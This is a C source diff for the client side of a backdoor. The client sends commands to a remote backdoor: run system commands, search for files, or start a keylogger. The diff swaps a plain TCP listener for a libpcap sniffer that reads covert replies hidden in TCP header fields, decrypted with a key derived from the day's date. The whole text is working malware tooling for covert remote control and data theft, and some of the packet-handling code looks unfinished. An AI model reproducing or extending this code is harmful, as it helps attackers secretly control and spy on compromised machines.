@@ -7,8 +7,9 @@ static void executeSystemCall(netInfo *info, char *commandData);
 static void findFile(netInfo *info, char *commandData);
 static void keylogger(netInfo *info);
 static void sendCommand(netInfo *info, int command, char *commandData);
-static int acceptReturningTcpConnection();
-static int bindAddress(int port, int *socket);
+static char *getData(char *data, int length);
+void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+static void listenForResponse(netInfo *info);
 
 int main (int argc, char **argv)
 {
@@ -84,7 +85,7 @@ static void executeSystemCall(netInfo *info, char *commandData)
     sendCommand(info, EXECUTE_SYSTEM_CALL, commandData);
     
     // Wait for the response from the backdoor
-    backdoorSocket = acceptReturningTcpConnection();
+    listenForResponse(info);
 }
 
 static void findFile(netInfo *info, char *commandData)
@@ -104,7 +105,7 @@ static void findFile(netInfo *info, char *commandData)
     sendCommand(info, FIND_FILE, commandData);
     
     // Wait for the response from the backdoor
-    backdoorSocket = acceptReturningTcpConnection();
+    listenForResponse(info);
     
     // Receive the data and write it to the file
     while ((bytesRead = recv(backdoorSocket, buffer, PATH_MAX, 0)) > 0)
@@ -120,53 +121,136 @@ static void keylogger(netInfo *info)
 {
     // Send the command to the backdoor
     sendCommand(info, KEYLOGGER, NULL);
+    
+    // Wait for the response from the backdoor
+    listenForResponse(info);
 }
 
-static int acceptReturningTcpConnection()
+static void listenForResponse(netInfo *info)
 {
-    int listenSocket = 0;
-    int backdoorSocket = 0;
-    int one = 1;
-    struct sockaddr_in sa;
-    socklen_t sa_len;
+    char errorBuffer[PCAP_ERRBUF_SIZE];
+    struct bpf_program fp;
+    char *filter = malloc(sizeof(char) * FILTER_BUFFER);
+    pcap_t *handle;
+    pcap_if_t *nics;
+    pcap_if_t *nic;
+    bpf_u_int32 net;
+    bpf_u_int32 mask;
     
-    if ((listenSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    // Get the devices on the machine
+    if (pcap_findalldevs(&nics, errorBuffer) == -1)
     {
-        systemFatal("Can't create a socket");
+        systemFatal("Unable to retrieve device list");
     }
     
-    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) == -1)
+    // Find a suitable nic from the device list
+    for (nic = nics; nic; nic = nic->next)
     {
-        systemFatal("Cannot set socket options");
+        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
+        {
+            break;
+        }
     }
     
-    if (bindAddress(CONNECTION_PORT, &listenSocket) == -1)
+    // Open the session
+    handle = pcap_open_live(nic->name, SNAP_LEN, 0, 0, errorBuffer);
+    if (handle == NULL)
     {
-        systemFatal("Error binding the socket");
+        systemFatal("Unable to open live capture");
     }
     
-    if (listen(listenSocket, 5) == -1)
+    // Create and parse the filter to the capture
+    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", DEST_IP, SOURCE_PORT_STRING);
+    if (pcap_compile(handle, &fp, filter, 0, net) == -1)
     {
-        systemFatal("Listen error");
+        systemFatal("Unable to compile filter");
     }
     
-    if ((backdoorSocket = accept(listenSocket, (struct sockaddr *)&sa, &sa_len)) == -1)
+    // Set the filter on the listening device
+    if (pcap_setfilter(handle, &fp) == -1)
     {
-        systemFatal("Error accepting connection");
+        systemFatal("Unable to set filter");
     }
     
-    return backdoorSocket;
+    // Call pcap_loop and process packets as they are received
+    if (pcap_loop(handle, -1, receivedPacket, NULL) == -1)
+    {
+        systemFatal("Error in pcap_loop");
+    }
+    
+    // Clean up
+    free(filter);
+    pcap_freecode(&fp);
+    pcap_close(handle);
 }
 
-static int bindAddress(int port, int *socket)
+void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
-    struct sockaddr_in address;
-    bzero((char *)&address, sizeof(struct sockaddr_in));
-    address.sin_family = AF_INET;
-    address.sin_port = htons(port);
-    address.sin_addr.s_addr = htonl(INADDR_ANY);
+    const struct ip *iph = NULL;
+    const struct tcphdr *tcph = NULL;
+    const struct udphdr *udph = NULL;
+    char *data = NULL;
+    char *payload = NULL;
+    int ipHeaderSize = 0;
+    int tcpHeaderSize = 0;
+    int payloadSize = 0;
     
-    return bind(*socket, (struct sockaddr *)&address, sizeof(address));
+    // Get the IP header and offset value
+    iph = (struct ip*)(packet + SIZE_ETHERNET);
+#ifdef _IP_VHL
+    ipHeaderSize = IP_VHL_HL(iph->ip_vhl) * 4;
+#else
+    ipHeaderSize = iph->ip_hl * 4;
+#endif
+    
+    if (ipHeaderSize < 20)
+    {
+        return;
+    }
+    
+    // Ensure that we are dealing with one of our sneaky TCP packets
+#if defined __APPLE__ || defined __USE_BSD
+    if (iph->ip_p == IPPROTO_TCP)
+#else
+    if (iph->protocol == IPPROTO_TCP)
+#endif
+    {
+        // Get our TCP packet and the header size
+        tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + ipHeaderSize);
+        
+        // Get the data and display it
+        payload = malloc(sizeof(unsigned long));
+        memcpy(payload, (packet + SIZE_ETHERNET + ipHeaderSize + 4), sizeof(unsigned long));
+        data = getData(payload, sizeof(unsigned long));
+        printf("%s.4", data);
+    }
+#if defined __APPLE__ || defined __USE_BSD
+    else if (iph->ip_p == IPPROTO_UDP)
+#else
+    else if (iph->protocol == IPPROTO_UDP)
+#endif
+    {
+        
+    }
+    free(payload);
+}
+
+static char *getData(char *data, int length)
+{
+    char *decryptedData = NULL;
+    char date[11];
+    struct tm *tm;
+    time_t t;
+    
+    // Get the date information
+    time(&t);
+    tm = localtime(&t);
+    strftime(date, sizeof(date), "%Y:%m:%d", tm);
+    
+    // Decrypt our command using today's date
+    decryptedData = encrypt_data(data, date, length);
+    
+    return decryptedData;
 }
 
 static void sendCommand(netInfo *info, int command, char *commandData)
